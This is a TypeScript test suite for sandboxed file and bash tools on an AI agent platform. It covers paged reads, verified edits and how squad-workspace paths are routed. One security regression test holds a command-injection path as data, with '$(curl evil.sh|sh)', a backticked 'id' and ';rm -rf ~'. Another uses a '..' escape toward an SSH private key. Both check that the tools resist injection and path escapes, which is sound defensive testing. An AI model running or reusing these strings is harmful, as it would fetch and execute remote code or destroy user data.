import { describe, test, expect, mock, spyOn } from 'bun:test'
import { EventEmitter } from 'events'
import {
  createK8sSandboxedCodingTools,
  K8S_SANDBOXED_TOOL_KEYS,
  createHttpBashOperations,
  createHttpReadOperations,
  createHttpWriteOperations,
  createHttpEditOperations,
  createK8sSandboxedReadTool,
  resolveAgentBashCwd,
  resolveSquadFileRoute,
} from './k8s-sandbox'
import { CONFIG_DIR, AGENT_DIR, SKILLS_DIR } from '../lib/paths'
import { MATERIALIZED_SKILLS_DIR, getSandboxSkillsDir } from '../services/agent/skill-materializer'
import { join } from 'path'
import { createHash } from 'crypto'
import { mkdirSync, rmSync, writeFileSync } from 'fs'
import { createReadTool } from '@earendil-works/pi-coding-agent'
import type { K8sSandboxManager } from '../services/sandbox/k8s'
import { resolveSandboxApiUrl } from '../services/sandbox/k8s/pod-spec'
import {
  BashOutcomeUnknownError,
  SandboxClient,
  SandboxHttpError,
  type BashResponse,
  type ClientReadableStream,
} from '../services/sandbox/k8s/http-client'
import { boxUnixUser } from '../services/machines/box-paths'
import * as workspaceLayoutModule from '../services/sandbox/workspace-layout'
import { sandboxRecoveryWatch } from '../services/sandbox/recovery-watch'

/**
 * Creates a mock stream that emits events like a ClientReadableStream.
 */
type MockStream = ClientReadableStream<BashResponse> & {
  emitData: (response: BashResponse) => void
  emitError: (err: Error) => void
  emitEnd: () => void
}

function createMockStream(): MockStream {
  const emitter = new EventEmitter()
  const stream = {
    invocationId: 'stable-invocation',
    on: (event: string, listener: (...args: any[]) => void) => {
      emitter.on(event, listener)
      return stream
    },
    cancel: mock(() => {
      emitter.emit('error', new Error('Stream cancelled'))
    }),
    cancelAndWait: mock(async () => {}),
    // Helper methods for testing
    emitData: (response: BashResponse) => {
      emitter.emit('data', response)
    },
    emitError: (err: Error) => {
      emitter.emit('error', err)
    },
    emitEnd: () => {
      emitter.emit('end')
    },
  }
  return stream as unknown as MockStream
}

/**
 * Creates a mock K8sSandboxManager that returns a mock client.
 */
function createMockManager(mockStream: MockStream) {
  return {
    getClientForSandbox: mock(() => ({
      bash: mock(() => mockStream),
    })),
    podManager: { namespace: 'tau-sandboxes' },
  } as unknown as K8sSandboxManager
}

describe('stable invocation identity', () => {
  test('binds execution and tool call identity without command text', async () => {
    const requests: any[] = []
    const manager = {
      getClientForSandbox: mock(() => ({
        bash: mock((request: any) => {
          requests.push(request)
          const stream = createMockStream()
          queueMicrotask(() => {
            stream.emitData({ exitCode: 0 })
            stream.emitEnd()
          })
          return stream
        }),
      })),
      podManager: { namespace: 'tau-sandboxes' },
    } as unknown as K8sSandboxManager
    const first = createK8sSandboxedCodingTools('/ignored', 'agent_a1', manager, undefined, undefined, 'exec-1').find(
      (tool) => tool.key === 'bash'
    )!
    const neighbor = createK8sSandboxedCodingTools(
      '/ignored',
      'agent_a1',
      manager,
      undefined,
      undefined,
      'exec-2'
    ).find((tool) => tool.key === 'bash')!

    await first.execute('tool-1', { command: 'echo secret' } as any)
    await first.execute('tool-1', { command: 'echo secret' } as any)
    await first.execute('tool-2', { command: 'echo secret' } as any)
    await neighbor.execute('tool-1', { command: 'echo secret' } as any)

    expect(requests[0].invocationId).toBe(requests[1].invocationId)
    expect(requests[0].invocationId).not.toBe(requests[2].invocationId)
    expect(requests[0].invocationId).not.toBe(requests[3].invocationId)
    expect(requests[0].invocationId).not.toContain('echo secret')
  })
})

describe('createK8sSandboxedCodingTools', () => {
  test('module exports factory function', () => {
    expect(typeof createK8sSandboxedCodingTools).toBe('function')
  })

  test('exports K8S_SANDBOXED_TOOL_KEYS constant', () => {
    expect(K8S_SANDBOXED_TOOL_KEYS).toEqual(['Read', 'Write', 'Edit', 'Bash'])
  })

  test('verified large-file edit preserves distant suffix', async () => {
    // Historical incident shape: 1,201 lines, 99,620 original bytes, SHA-256
    // 3305e626...; the verified result is 99,468 bytes, SHA-256 bc7ad943....
    const fixtureLine = (line: number) => `line-${String(line).padStart(4, '0')} ${'x'.repeat(72)}\n`
    const original = Buffer.from(
      Array.from({ length: 1200 }, (_, index) => fixtureLine(index + 1)).join('') + 'EOF-SUFFIX-SENTINEL\n'
    )
    expect(original.byteLength).toBe(99_620)
    expect(createHash('sha256').update(original).digest('hex')).toBe(
      '3305e62646c49ce1e78a3f7513b55bca5cdb13d9409028bf52eea73812689b2a'
    )

    let stored = original
    const readRequests: Array<{ offset?: number; limit?: number }> = []
    const client = {
      read: mock(async ({ offset = 0, limit = 50 * 1024 }: { offset?: number; limit?: number }) => {
        readRequests.push({ offset, limit })
        return {
          content: stored.subarray(offset, offset + limit).toString('base64'),
          totalSize: stored.byteLength,
        }
      }),
      write: mock(async () => {
        throw new Error('verified edit must never fall back to legacy write')
      }),
      writeVerified: mock(
        async ({ content, expectedResult }: { content: string; expectedResult: { bytes: number; sha256: string } }) => {
          stored = Buffer.from(content, 'base64')
          return { bytesWritten: expectedResult.bytes, sha256: expectedResult.sha256 }
        }
      ),
      stat: mock(async () => ({ exists: true })),
    }
    const manager = {
      getClientForSandbox: mock(() => client),
      getSandboxStatus: mock(async () => ({ status: 'running' })),
    } as unknown as K8sSandboxManager
    const edit = createK8sSandboxedCodingTools('/ignored', 'agent_fixture', manager).find(
      (tool) => tool.key === 'edit'
    )!

    const result = await edit.execute('tc-large-edit', {
      path: '/workspace/sq1/large.ts',
      edits: [
        { oldText: fixtureLine(20).trimEnd(), newText: 'EDIT-A' },
        { oldText: fixtureLine(600).trimEnd(), newText: 'EDIT-B' },
      ],
    } as any)

    expect(result.content).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ text: expect.stringContaining('Successfully replaced 2 block(s)') }),
      ])
    )
    expect(
      readRequests.reduce((end, request) => Math.max(end, (request.offset ?? 0) + (request.limit ?? 0)), 0)
    ).toBeGreaterThanOrEqual(original.byteLength)
    expect(stored.byteLength).toBe(99_468)
    expect(createHash('sha256').update(stored).digest('hex')).toBe(
      'bc7ad9438ba91e1e1928d36115982bbcf8c9931dfec338a6e9d97acba625b10f'
    )
    expect(stored.subarray(-'EOF-SUFFIX-SENTINEL\n'.length).toString()).toBe('EOF-SUFFIX-SENTINEL\n')
    expect(client.writeVerified).toHaveBeenCalledTimes(1)
    expect(client.write).not.toHaveBeenCalled()
  })

  test('resolver seam: calls resolveWorkspaceLayout() for the tool root cwd', () => {
    // This test proves the seam: createK8sSandboxedCodingTools must call
    // resolveWorkspaceLayout() to determine the container workspace path.
    // Before this change the factory read WORKSPACE_MOUNT directly (resolver
    // was never called); after the change the resolver is always consulted.
    const spy = spyOn(workspaceLayoutModule, 'resolveWorkspaceLayout')

    try {
      // A null manager is fine here — tool creation does not call the manager.
      createK8sSandboxedCodingTools('/ignored', 'test-sandbox-seam', null as unknown as K8sSandboxManager)
      expect(spy).toHaveBeenCalled()
    } finally {
      spy.mockRestore()
    }
  })

  test('namespaced cwd root: passes squadId + sandboxId to resolveWorkspaceLayout when building squad tools', () => {
    const spy = spyOn(workspaceLayoutModule, 'resolveWorkspaceLayout')

    try {
      // A null manager is fine here — tool creation does not call the manager.
      createK8sSandboxedCodingTools('/ignored', 'squad_sq1', null as unknown as K8sSandboxManager, undefined, 'sq1')
      expect(spy).toHaveBeenCalledWith({ squadId: 'sq1', sandboxId: 'squad_sq1' })
    } finally {
      spy.mockRestore()
    }
  })

  test('resolveAgentBashCwd: the private dir (/private on the container runtimes)', () => {
    expect(resolveAgentBashCwd()).toBe('/private')
    expect(resolveAgentBashCwd('agent_abc')).toBe('/private')
  })

  test('resolveAgentBashCwd: box-native ~/.private on the vm runtime', () => {
    const prev = process.env.FICUS_SANDBOX_RUNTIME
    process.env.FICUS_SANDBOX_RUNTIME = 'vm'
    try {
      expect(resolveAgentBashCwd('agent_abc')).toBe(`/home/${boxUnixUser('agent_abc')}/.private`)
    } finally {
      if (prev === undefined) delete process.env.FICUS_SANDBOX_RUNTIME
      else process.env.FICUS_SANDBOX_RUNTIME = prev
    }
  })

  test('vm squad member: a denied private-bash touch of the squad workspace names squad_bash', async () => {
    const prev = process.env.FICUS_SANDBOX_RUNTIME
    process.env.FICUS_SANDBOX_RUNTIME = 'vm'
    try {
      const squadId = 'sq-hint'
      const workspaceMount = `/home/${boxUnixUser(`squad_${squadId}`)}/workspace`
      const denied = `bash: line 1: cd: ${workspaceMount}/repo: Permission denied\n`
      const manager = {
        getClientForSandbox: mock(() => ({
          bash: mock(() => {
            const stream = createMockStream()
            queueMicrotask(() => {
              stream.emitData({ stderr: Buffer.from(denied).toString('base64') })
              stream.emitData({ exitCode: 1 })
              stream.emitEnd()
            })
            return stream
          }),
        })),
        podManager: { namespace: 'tau-sandboxes' },
      } as unknown as K8sSandboxManager

      const squadBash = createK8sSandboxedCodingTools(
        '/ignored',
        'agent_abc',
        manager,
        undefined,
        squadId,
        'exec-1'
      ).find((tool) => tool.key === 'bash')!
      await expect(squadBash.execute('tc', { command: `cd ${workspaceMount}/repo && ls` } as any)).rejects.toThrow(
        /Permission denied[\s\S]*is the SHARED squad workspace[\s\S]*`squad_bash`/
      )

      // Solo agents have no shared workspace, so the same denial stays bare.
      const soloBash = createK8sSandboxedCodingTools(
        '/ignored',
        'agent_abc',
        manager,
        undefined,
        undefined,
        'exec-1'
      ).find((tool) => tool.key === 'bash')!
      await expect(soloBash.execute('tc', { command: `cd ${workspaceMount}/repo && ls` } as any)).rejects.toThrow(
        /Permission denied[\s\S]*Command exited with code 1$/
      )
      await expect(soloBash.execute('tc', { command: `cd ${workspaceMount}/repo && ls` } as any)).rejects.not.toThrow(
        /squad_bash/
      )
    } finally {
      if (prev === undefined) delete process.env.FICUS_SANDBOX_RUNTIME
      else process.env.FICUS_SANDBOX_RUNTIME = prev
    }
  })

  test('read/write/edit reject relative paths', async () => {
    const tools = createK8sSandboxedCodingTools(
      '/ignored',
      'agent_abc',
      null as unknown as K8sSandboxManager,
      undefined,
      'sq1'
    )
    // pi-coding-agent's read/write/edit tools use the `path` arg key, so the
    // single-key case is what actually exercises the wrapper in production.
    for (const key of ['read', 'write', 'edit'] as const) {
      const tool = tools.find((t) => t.key === key)!
      await expect(tool.execute('tc', { path: 'rel/file.txt' } as any)).rejects.toThrow(/absolute/i)
    }
  })
})

describe('complete remote read', () => {
  function expectSameBoundedBytes(actual: Buffer, expected: Buffer) {
    expect(actual.byteLength).toBe(expected.byteLength)
    expect(createHash('sha256').update(actual).digest('hex')).toBe(createHash('sha256').update(expected).digest('hex'))
    expect(actual.subarray(0, 16)).toEqual(expected.subarray(0, 16))
    expect(actual.subarray(-16)).toEqual(expected.subarray(-16))
  }

  function managerWithRead(
    read: (request: { path: string; offset?: number; limit?: number }) => Promise<{
      content: string
      totalSize: number
    }>
  ) {
    return {
      getClientForSandbox: mock(() => ({ read, stat: mock(async () => ({ exists: true })) })),
      getSandboxStatus: mock(async () => ({ status: 'running' })),
    } as unknown as K8sSandboxManager
  }

  test('complete remote read consumes a 99,620-byte file across short pages', async () => {
    const original = Buffer.alloc(99_620, 0x61)
    const requests: Array<{ offset?: number; limit?: number }> = []
    const manager = managerWithRead(async (request) => {
      requests.push(request)
      const offset = request.offset ?? 0
      const pageBytes = Math.min(request.limit ?? 50 * 1024, 32 * 1024)
      return {
        content: original.subarray(offset, offset + pageBytes).toString('base64'),
        totalSize: original.byteLength,
      }
    })

    const result = await createHttpReadOperations(manager, 'agent_paging').readFile('/private/large.ts')

    expectSameBoundedBytes(result, original)
    expect(requests.length).toBeGreaterThan(1)
    expect(requests.every((request) => request.offset !== undefined && request.limit !== undefined)).toBe(true)
  })

  test('complete remote read crosses the configured 1 MiB page boundary at exact offsets', async () => {
    const original = Buffer.concat([Buffer.alloc(1024 * 1024, 0x64), Buffer.from('BOUNDARY-EOF-SENTINEL')])
    const requests: Array<{ path: string; offset?: number; limit?: number }> = []
    const manager = managerWithRead(async (request) => {
      requests.push(request)
      const offset = request.offset ?? 0
      const limit = request.limit ?? 50 * 1024
      return {
        content: original.subarray(offset, offset + limit).toString('base64'),
        totalSize: original.byteLength,
      }
    })

    const result = await createHttpReadOperations(manager, 'agent_page_boundary').readFile('/private/boundary.ts')

    expectSameBoundedBytes(result, original)
    expect(result.subarray(-21).toString()).toBe('BOUNDARY-EOF-SENTINEL')
    expect(requests).toEqual([
      { path: '/private/boundary.ts', offset: 0, limit: 1024 * 1024 },
      { path: '/private/boundary.ts', offset: 1024 * 1024, limit: 1024 * 1024 },
    ])
  })

  test('complete remote read continues after a non-empty page shorter than the requested limit', async () => {
    const original = Buffer.from('short-page-'.repeat(10_000))
    const manager = managerWithRead(async ({ offset = 0, limit = 50 * 1024 }) => ({
      content: original.subarray(offset, offset + Math.min(limit, 17_003)).toString('base64'),
      totalSize: original.byteLength,
    }))

    const result = await createHttpReadOperations(manager, 'agent_short_page').readFile('/private/large.ts')

    expectSameBoundedBytes(result, original)
  })

  test('complete remote read rejects an oversized advertisement before accumulating pages', async () => {
    let calls = 0
    const manager = managerWithRead(async () => {
      calls += 1
      return {
        // Empty content makes the cap-removal mutant fail immediately on the
        // bounded zero-progress guard instead of retaining millions of chunks.
        content: '',
        totalSize: 64 * 1024 * 1024 + 1,
      }
    })

    await expect(
      createHttpReadOperations(manager, 'agent_oversized').readFile('/private/oversized.ts')
    ).rejects.toThrow(/remote read advertised 67108865 bytes; maximum is 67108864 bytes/i)
    expect(calls).toBe(1)
  })

  test('complete remote read rejects when totalSize changes between pages', async () => {
    const original = Buffer.alloc(80_000, 0x62)
    let calls = 0
    const manager = managerWithRead(async ({ offset = 0 }) => {
      calls += 1
      return {
        content: original.subarray(offset, offset + 40_000).toString('base64'),
        totalSize: calls === 1 ? original.byteLength : original.byteLength + 1,
      }
    })

    await expect(createHttpReadOperations(manager, 'agent_changed_size').readFile('/private/large.ts')).rejects.toThrow(
      /file size changed while reading/i
    )
  })

  test('complete remote read rejects a zero-progress page before advertised EOF', async () => {
    const manager = managerWithRead(async () => ({ content: '', totalSize: 10 }))

    await expect(
      createHttpReadOperations(manager, 'agent_zero_progress').readFile('/private/large.ts')
    ).rejects.toThrow(/remote read stopped at 0 of 10 bytes/i)
  })

  test('complete remote read accepts a final page ending exactly at EOF', async () => {
    const original = Buffer.alloc(102_400, 0x63)
    const requests: Array<{ offset?: number; limit?: number }> = []
    const manager = managerWithRead(async (request) => {
      requests.push(request)
      const offset = request.offset ?? 0
      return {
        content: original.subarray(offset, offset + 25_600).toString('base64'),
        totalSize: original.byteLength,
      }
    })

    const result = await createHttpReadOperations(manager, 'agent_exact_eof').readFile('/private/large.ts')

    expectSameBoundedBytes(result, original)
    expect(requests).toHaveLength(4)
  })

  test('model-facing default read matches complete-buffer truncation with bounded transport', async () => {
    // An oversized first line makes both paths exercise the same byte-limit
    // branch without depending on unavailable remote total-line metadata.
    const original = Buffer.concat([Buffer.alloc(64 * 1024, 0x61), Buffer.from('\n'), Buffer.alloc(3 * 1024 * 1024)])
    const requests: Array<{ offset?: number; limit?: number }> = []
    const manager = managerWithRead(async (request) => {
      requests.push(request)
      const offset = request.offset ?? 0
      const limit = request.limit ?? 50 * 1024
      return {
        content: original.subarray(offset, offset + limit).toString('base64'),
        totalSize: original.byteLength,
      }
    })
    const rangedTool = createK8sSandboxedReadTool('/ignored', 'agent_bounded_read', manager)
    const completeBufferTool = createReadTool('/ignored', {
      operations: {
        access: async () => {},
        readFile: async () => original,
      },
    })

    const [rangedResult, completeResult] = await Promise.all([
      rangedTool.execute('tc-bounded-read', { path: '/private/large.ts' } as any),
      completeBufferTool.execute('tc-complete-read', { path: '/private/large.ts' } as any),
    ])

    expect(rangedResult.content).toEqual(completeResult.content)
    expect(requests.map(({ offset, limit }) => ({ offset, limit }))).toEqual([
      { offset: 0, limit: 4100 }, // Bounded image sniff before the unchanged text read.
      { offset: 0, limit: 1024 * 1024 },
    ])
  })

  test('line range hint scans past 50 KiB and returns enough input for pi to select the requested lines', async () => {
    const lines = Array.from({ length: 8_000 }, (_, index) => `line-${String(index + 1).padStart(5, '0')}`)
    const original = Buffer.from(lines.join('\n'))
    const requests: Array<{ offset?: number; limit?: number }> = []
    const manager = managerWithRead(async (request) => {
      requests.push(request)
      const offset = request.offset ?? 0
      const limit = Math.min(request.limit ?? 50 * 1024, 16 * 1024)
      return {
        content: original.subarray(offset, offset + limit).toString('base64'),
        totalSize: original.byteLength,
      }
    })
    const tool = createK8sSandboxedReadTool('/ignored', 'agent_offset_read', manager)

    const result = await tool.execute('tc-offset-read', {
      path: '/private/large.ts',
      offset: 6_000,
      limit: 2,
    } as any)

    expect(result.content[0]).toEqual(
      expect.objectContaining({ text: expect.stringContaining('line-06000\nline-06001') })
    )
    expect(requests.length).toBeGreaterThan(1)
    expect(requests[0]).toMatchObject({ offset: 0, limit: 4100 })
    const textRequests = requests.slice(1)
    expect(textRequests.map((request) => request.offset)).toEqual(textRequests.map((_, index) => index * 16 * 1024))
    expect((requests.at(-1)?.offset ?? 0) + 16 * 1024).toBeLessThan(original.byteLength)
  })

  test('edit operations retain complete transport for a 3 MiB file', async () => {
    const original = Buffer.alloc(3 * 1024 * 1024, 0x65)
    const requests: Array<{ offset?: number; limit?: number }> = []
    const manager = managerWithRead(async (request) => {
      requests.push(request)
      const offset = request.offset ?? 0
      const limit = request.limit ?? 50 * 1024
      return {
        content: original.subarray(offset, offset + limit).toString('base64'),
        totalSize: original.byteLength,
      }
    })

    const result = await createHttpEditOperations(manager, 'agent_complete_edit').readFile('/private/large.ts')

    expectSameBoundedBytes(result, original)
    expect(requests.map(({ offset, limit }) => ({ offset, limit }))).toEqual([
      { offset: 0, limit: 1024 * 1024 },
      { offset: 1024 * 1024, limit: 1024 * 1024 },
      { offset: 2 * 1024 * 1024, limit: 1024 * 1024 },
    ])
  })

  test('ranged remote read rejects when totalSize changes during its page walk', async () => {
    const original = Buffer.from('line\n'.repeat(30_000))
    let calls = 0
    const manager = managerWithRead(async ({ offset = 0, limit = 50 * 1024 }) => {
      calls += 1
      return {
        content: original.subarray(offset, offset + Math.min(limit, 16 * 1024)).toString('base64'),
        totalSize: original.byteLength + (calls > 1 ? 1 : 0),
      }
    })

    await expect(
      createHttpReadOperations(manager, 'agent_changed_range').readFile('/private/large.ts', {
        offset: 20_000,
        limit: 2,
      })
    ).rejects.toThrow(/file size changed while reading/i)
    expect(calls).toBe(2)
  })
})

// The vm runtime drives these SAME client-based tools against a box's
// SandboxClient. The tools address k8s LOGICAL container roots (/workspace/<squadId>,
// /private, /memory) — never box-native paths — so a box on a shared machine only
// works because the sandbox-server REBASES those logical roots onto the box HOME
// (packages/k8s-sandbox resolvePath + bash cwd; proven in that package's
// paths.test.ts). These tests lock the vm-side half of that contract: the tools
// send the logical path through UNCHANGED (Read/Bash below; Write is symmetric —
// createHttpWriteOperations forwards the same absolute path to client.write, see
// the outage-mapping suite's read passthrough at '/workspace/src/index.ts').
describe('VM box: coding tools address LOGICAL roots (the box server rebases them)', () => {
  test('read forwards the logical /workspace/<squadId> path unchanged to the client', async () => {
    const readMock = mock(async () => ({ content: Buffer.from('x').toString('base64'), totalSize: 1 }))
    const manager = {
      getClientForSandbox: mock(() => ({ read: readMock })),
      getSandboxStatus: mock(async () => ({ status: 'running' })),
    } as unknown as K8sSandboxManager
    const ops = createHttpReadOperations(manager, 'squad_sq1')
    await ops.readFile('/workspace/sq1/src/index.ts')
    // NOT rebased Core-side: the box server maps /workspace/sq1 → ~/workspace.
    expect(readMock).toHaveBeenCalledWith({
      path: '/workspace/sq1/src/index.ts',
      offset: 0,
      limit: 1024 * 1024,
    })
  })

  test('bash forwards the logical cwd (/private, /workspace/<squadId>) unchanged to the client', async () => {
    const bashCalls: Array<{ cwd?: string }> = []
    const manager = {
      getClientForSandbox: mock(() => ({
        bash: (req: { cwd?: string }) => {
          bashCalls.push({ cwd: req.cwd })
          const stream = createMockStream()
          queueMicrotask(() => {
            stream.emitData({ exitCode: 0 } as BashResponse)
            stream.emitEnd()
          })
          return stream
        },
      })),
      getSandboxStatus: mock(async () => ({ status: 'running' })),
      resolveToolApiUrl: () => 'http://127.0.0.1:1234',
    } as unknown as K8sSandboxManager

    // Personal agent bash cwd is the logical /private.
    const agentOps = createHttpBashOperations(manager, 'agent_a1')
    await agentOps.exec('pwd', resolveAgentBashCwd(), { onData: () => {} })
    // squad_bash cwd is the logical /workspace/<squadId>.
    const squadOps = createHttpBashOperations(manager, 'squad_sq1')
    await squadOps.exec('pwd', workspaceLayoutModule.resolveWorkspaceLayout({ squadId: 'sq1' }).workspaceMount, {
      onData: () => {},
    })

    expect(bashCalls.map((c) => c.cwd)).toEqual(['/private', '/workspace/sq1'])
  })
})

// On the vm runtime each box is a separate unix user, so a squad MEMBER's own
// client cannot reach the shared squad workspace in the SQUAD box's home. The
// file ops accept an optional squadRoute: absolute paths under the squad
// workspace root are served by the squad warm box's authenticated client
// (core-held token — the member box never gains FS access to the squad box);
// everything else stays on the member's own client. Container runtimes never
// pass a squadRoute, so their behavior is byte-identical to before.
describe('squad file route: path-routed read/write/edit', () => {
  const squadRoute = { sandboxId: 'squad_sq1', workspaceRoot: '/home/sqbox/workspace' }

  function routingManager() {
    const memberClient = {
      read: mock(async () => ({ content: Buffer.from('member').toString('base64'), totalSize: 6 })),
      write: mock(async () => ({})),
      writeVerified: mock(async ({ expectedResult }: { expectedResult: { bytes: number; sha256: string } }) => ({
        bytesWritten: expectedResult.bytes,
        sha256: expectedResult.sha256,
      })),
      mkdir: mock(async () => ({ ok: true })),
      stat: mock(async () => ({ exists: true })),
      bash: mock(() => {
        throw new Error('file ops must never shell out via client.bash')
      }),
    }
    const squadClient = {
      read: mock(async () => ({ content: Buffer.from('squad').toString('base64'), totalSize: 5 })),
      write: mock(async () => ({})),
      writeVerified: mock(async ({ expectedResult }: { expectedResult: { bytes: number; sha256: string } }) => ({
        bytesWritten: expectedResult.bytes,
        sha256: expectedResult.sha256,
      })),
      mkdir: mock(async () => ({ ok: true })),
      stat: mock(async () => ({ exists: true })),
      bash: mock(() => {
        throw new Error('file ops must never shell out via client.bash')
      }),
    }
    const manager = {
      getClientForSandbox: mock((id: string) =>
        id === 'squad_sq1' ? squadClient : id === 'agent_a1' ? memberClient : null
      ),
      getSandboxStatus: mock(async () => ({ status: 'running' })),
    } as unknown as K8sSandboxManager
    return { manager, memberClient, squadClient }
  }

  test('readFile under the squad workspace root routes to the squad client', async () => {
    const { manager, memberClient, squadClient } = routingManager()
    const ops = createHttpReadOperations(manager, 'agent_a1', squadRoute)

    const content = await ops.readFile('/home/sqbox/workspace/src/app.ts')

    expect(squadClient.read).toHaveBeenCalledWith({
      path: '/home/sqbox/workspace/src/app.ts',
      offset: 0,
      limit: 1024 * 1024,
    })
    expect(memberClient.read).not.toHaveBeenCalled()
    expect(content.toString()).toBe('squad')
  })

  test('paths outside the root stay on the member client (private dir, sibling, ..-escape)', async () => {
    const { manager, memberClient, squadClient } = routingManager()
    const ops = createHttpReadOperations(manager, 'agent_a1', squadRoute)

    await ops.readFile('/home/member/.private/notes.md')
    // Prefix boundary: a sibling dir sharing the root as a string prefix.
    await ops.readFile('/home/sqbox/workspace-other/file.txt')
    // Lexical ..-escape out of the workspace resolves OUTSIDE the root.
    await ops.readFile('/home/sqbox/workspace/../.ssh/id_ed25519')

    expect(memberClient.read).toHaveBeenCalledTimes(3)
    expect(squadClient.read).not.toHaveBeenCalled()
    // The escape is normalized before being sent on.
    expect(memberClient.read).toHaveBeenCalledWith({
      path: '/home/sqbox/.ssh/id_ed25519',
      offset: 0,
      limit: 1024 * 1024,
    })
  })

  test('boundary: the root itself and nested paths match; a "-evil" sibling does not', async () => {
    const { manager, memberClient, squadClient } = routingManager()
    const ops = createHttpReadOperations(manager, 'agent_a1', squadRoute)

    await ops.access('/home/sqbox/workspace')
    await ops.access('/home/sqbox/workspace/a/b')
    await ops.access('/home/sqbox/workspace-evil/a')

    expect(squadClient.stat).toHaveBeenCalledTimes(2)
    expect(memberClient.stat).toHaveBeenCalledTimes(1)
    expect(memberClient.stat).toHaveBeenCalledWith({ path: '/home/sqbox/workspace-evil/a' })
  })

  test('without a squadRoute every path stays on the member client (container runtimes unchanged)', async () => {
    const { manager, memberClient, squadClient } = routingManager()
    const ops = createHttpReadOperations(manager, 'agent_a1')

    await ops.readFile('/home/sqbox/workspace/src/app.ts')

    expect(memberClient.read).toHaveBeenCalledWith({
      path: '/home/sqbox/workspace/src/app.ts',
      offset: 0,
      limit: 1024 * 1024,
    })
    expect(squadClient.read).not.toHaveBeenCalled()
  })

  test('writeFile routes squad paths to the squad client and member paths to the member client', async () => {
    const { manager, memberClient, squadClient } = routingManager()
    const ops = createHttpWriteOperations(manager, 'agent_a1', squadRoute)

    await ops.writeFile('/home/sqbox/workspace/README.md', 'shared')
    await ops.writeFile('/home/member/.private/scratch.md', 'mine')

    expect(squadClient.write).toHaveBeenCalledWith({
      path: '/home/sqbox/workspace/README.md',
      content: Buffer.from('shared').toString('base64'),
      createDirs: true,
    })
    expect(memberClient.write).toHaveBeenCalledWith({
      path: '/home/member/.private/scratch.md',
      content: Buffer.from('mine').toString('base64'),
      createDirs: true,
    })
  })

  test('mkdir routes squad paths to the squad client and member paths to the member client', async () => {
    const { manager, memberClient, squadClient } = routingManager()
    const ops = createHttpWriteOperations(manager, 'agent_a1', squadRoute)

    await ops.mkdir('/home/sqbox/workspace/new/dir')
    await ops.mkdir('/home/member/.private/scratch')

    expect(squadClient.mkdir).toHaveBeenCalledWith({ path: '/home/sqbox/workspace/new/dir' })
    expect(memberClient.mkdir).toHaveBeenCalledWith({ path: '/home/member/.private/scratch' })
    // The whole point of the structured RPC: no shell is ever involved.
    expect(squadClient.bash).not.toHaveBeenCalled()
    expect(memberClient.bash).not.toHaveBeenCalled()
  })

  test('SECURITY: a metacharacter-laden squad path never reaches a shell — mkdir sends it as data', async () => {
    // Regression test for a squad-routed write injection: ops.mkdir used to run
    // `client.bash({ command: `mkdir -p "${path}"` })`, so a path containing
    // $(...)/backticks/; executed arbitrary commands as the SQUAD box's unix
    // user — from a member (incl. consultant/subagents) that deliberately has no
    // squad_bash. The pi SDK write tool calls ops.mkdir(dirname) before EVERY
    // write, making any write with a crafted path an escalation.
    const { manager, memberClient, squadClient } = routingManager()
    const ops = createHttpWriteOperations(manager, 'agent_a1', squadRoute)

    const evil = '/home/sqbox/workspace/$(curl evil.sh|sh)/`id`/a;rm -rf ~'
    await ops.mkdir(evil)

    // Metacharacters arrive byte-for-byte as a structured JSON field...
    expect(squadClient.mkdir).toHaveBeenCalledWith({ path: evil })
    // ...and NO shell is invoked on either box.
    expect(squadClient.bash).not.toHaveBeenCalled()
    expect(memberClient.bash).not.toHaveBeenCalled()
  })

  test('edit ops route BOTH the read and write legs of a squad path to the squad client', async () => {
    const { manager, memberClient, squadClient } = routingManager()
    const ops = createHttpEditOperations(manager, 'agent_a1', squadRoute)

    await ops.readFile('/home/sqbox/workspace/src/app.ts')
    const result = Buffer.from('edited')
    const identity = {
      original: { bytes: 5, sha256: 'a'.repeat(64) },
      result: { bytes: result.byteLength, sha256: 'b'.repeat(64) },
    }
    await ops.commitFile('/home/sqbox/workspace/src/app.ts', result, identity)

    expect(squadClient.read).toHaveBeenCalledWith({
      path: '/home/sqbox/workspace/src/app.ts',
      offset: 0,
      limit: 1024 * 1024,
    })
    expect(squadClient.writeVerified).toHaveBeenCalledWith({
      path: '/home/sqbox/workspace/src/app.ts',
      content: result.toString('base64'),
      expectedOriginal: identity.original,
      expectedResult: identity.result,
    })
    expect(squadClient.write).not.toHaveBeenCalled()
    expect(memberClient.read).not.toHaveBeenCalled()
    expect(memberClient.writeVerified).not.toHaveBeenCalled()
    expect(memberClient.write).not.toHaveBeenCalled()
  })

  test('missing squad client surfaces the structured squad-box outage error and registers a watch', async () => {
    const registerSpy = spyOn(sandboxRecoveryWatch, 'register').mockResolvedValue(undefined)
    try {
      const memberClient = { read: mock(async () => ({ content: '' })) }
      const manager = {
        getClientForSandbox: mock((id: string) => (id === 'agent_a1' ? memberClient : null)),
        getSandboxStatus: mock(async () => ({ status: 'failed', reason: 'OOMKilled' })),
      } as unknown as K8sSandboxManager
      const ops = createHttpReadOperations(manager, 'agent_a1', squadRoute)

      await expect(ops.readFile('/home/sqbox/workspace/src/app.ts')).rejects.toThrow(/currently unavailable/)
      // The watch is registered for the CALLING agent against the SQUAD box.
      expect(registerSpy).toHaveBeenCalledWith(expect.objectContaining({ agentId: 'a1', sandboxIds: ['squad_sq1'] }))
    } finally {
      registerSpy.mockRestore()
    }
  })
})

describe('mkdir rollout tolerance: stale box bundle without the /mkdir route', () => {
  // The box server bundle is content-hash versioned and pushed per-box, so
  // during the /mkdir RPC rollout a live box may still run a pre-RPC bundle
  // that 404s the route. ops.mkdir swallows exactly that 404 (the follow-up
  // writeFile carries createDirs: true as the server-side backstop); every
  // other failure must still propagate.
  function managerWith(client: Record<string, unknown>, status = 'running') {
    return {
      getClientForSandbox: mock(() => client),
      getSandboxStatus: mock(async () => ({ status })),
    } as unknown as K8sSandboxManager
  }

  test('mkdir swallows a 404 (route not found on an old bundle) and resolves', async () => {
    const client = {
      mkdir: mock(async () => {
        throw new SandboxHttpError('Request failed: 404', 404)
      }),
    }
    const ops = createHttpWriteOperations(managerWith(client), 'agent_a1')

    await expect(ops.mkdir('/home/member/workspace/new/dir')).resolves.toBeUndefined()
    expect(client.mkdir).toHaveBeenCalledWith({ path: '/home/member/workspace/new/dir' })
  })

  test('a 400 (e.g. path-guard rejection) still propagates', async () => {
    const client = {
      mkdir: mock(async () => {
        throw new SandboxHttpError('path escapes the allowed roots', 400)
      }),
    }
    const ops = createHttpWriteOperations(managerWith(client), 'agent_a1')

    await expect(ops.mkdir('/etc/evil')).rejects.toThrow('path escapes the allowed roots')
  })

